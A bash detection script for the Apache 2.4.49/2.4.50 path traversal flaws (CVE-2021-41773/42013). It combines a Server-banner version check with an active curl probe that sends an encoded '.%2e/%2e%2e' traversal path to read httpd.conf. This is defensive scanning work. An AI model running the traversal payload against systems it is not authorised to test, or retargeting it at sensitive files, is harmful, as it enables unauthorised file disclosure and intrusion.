#!/bin/bash
#
# Detection script for CVE-2021-41773 / CVE-2021-42013
#
# Usage: ./detect.sh <target_host:port>
#
# Performs two independent checks:
#   1. Passive: reads the Server response header to identify the Apache
#      version. Versions 2.4.49 and 2.4.50 are flagged as vulnerable
#      (2.4.51+ is patched). This is fast but unreliable if the banner
#      has been suppressed/spoofed.
#   2. Active: sends a HARMLESS traversal probe (reads Apache's own
#      httpd.conf rather than a sensitive system file) and checks
#      whether the response contains config content. This confirms
#      actual exploitability rather than trusting the banner alone.

set -euo pipefail
TARGET="${1:?Usage: $0 <host:port>}"

echo "[*] Detection run against: $TARGET"
echo

echo "--- Check 1: Version banner ---"
BANNER=$(curl -s -I "http://${TARGET}/" | grep -i '^Server:' || echo "Server: (header suppressed)")
echo "$BANNER"

if echo "$BANNER" | grep -qE '2\.4\.49|2\.4\.50'; then
    echo "[!] Banner indicates a version affected by CVE-2021-41773/42013."
elif echo "$BANNER" | grep -qE '2\.4\.(5[1-9]|[6-9][0-9])'; then
    echo "[+] Banner indicates a patched version (>= 2.4.51)."
else
    echo "[?] Could not determine version from banner alone; relying on active check."
fi
echo

echo "--- Check 2: Active traversal probe (reads httpd.conf, not a sensitive file) ---"
RESPONSE=$(curl -s --path-as-is "http://${TARGET}/static/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/usr/local/apache2/conf/httpd.conf")

if echo "$RESPONSE" | grep -qi "ServerRoot"; then
    echo "[!] VULNERABLE — traversal probe successfully read httpd.conf contents."
    echo "    (first matching line below)"
    echo "$RESPONSE" | grep -i "ServerRoot" | head -n1
    EXIT_CODE=1
else
    echo "[+] NOT VULNERABLE — traversal probe did not return config contents."
    EXIT_CODE=0
fi

echo
echo "=== Summary ==="
if [ "$EXIT_CODE" -eq 1 ]; then
    echo "Result: VULNERABLE to CVE-2021-41773/CVE-2021-42013"
else
    echo "Result: NOT vulnerable (or already remediated)"
fi

exit $EXIT_CODE
